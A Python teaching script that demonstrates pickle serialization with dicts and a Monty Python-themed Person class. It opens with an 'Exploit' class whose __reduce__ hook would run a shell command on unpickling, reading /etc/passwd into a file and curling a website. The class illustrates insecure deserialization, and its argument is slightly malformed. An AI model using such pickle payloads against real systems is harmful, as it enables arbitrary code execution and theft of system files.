import os
import pickle
from datetime import datetime
from pprint import pprint


class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt'))


def serialize_exploit(fname):
    with open(fname, 'wb') as f:
        pickle.dump(Exploit(), f)


ser = pickle.dumps('Python Pickle Peppers')
print(ser)
deser = pickle.loads(ser)
print(deser)

d = {
    'a': 100,
    'b': [1, 2, 3],
    'c': (1, 2, 3),
    'd': {'x': 1+1j, 'y': datetime.utcnow()}
}
ser = pickle.dumps(d)
deser = pickle.loads(ser)
print(deser)
print(deser == d)
print(deser is d)

d1 = {'a': 10, 'b ': 20}
d2 = {'x': 100, 'y': d1}
ser = pickle.dumps(d2)
d3 = pickle.loads(ser)
print(d3)


class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def __eq__(self, other):
        return self.name == other.name and self.age == other.age

    def __repr__(self):
        return f'Person(name={self.name},age={self.age})'


john = Person('JOhn Cleese', 79)
eric = Person('Eric Idle', 75)
micheal = Person('Micheal Palin', 75)
parrot_sketch = {
    'title': 'Parrot Sketch',
    'actors': [john, micheal]
}

ministry_sketch = {
    'title': 'The Ministry of Silly Walks',
    'actors': [john, micheal]
}

joke_sketch = {
    'title': "Funniest Joke in the world",
    'actors': [eric, micheal]
}

fan_favourites = {
    'user_1': [parrot_sketch, joke_sketch],
    'user_2': [parrot_sketch, ministry_sketch]
}

# pprint(fan_favourites)
parrot_id_original = id(parrot_sketch)
ser = pickle.dumps(fan_favourites)
new_fan_favourite = pickle.loads(ser)
print(fan_favourites == new_fan_favourite)
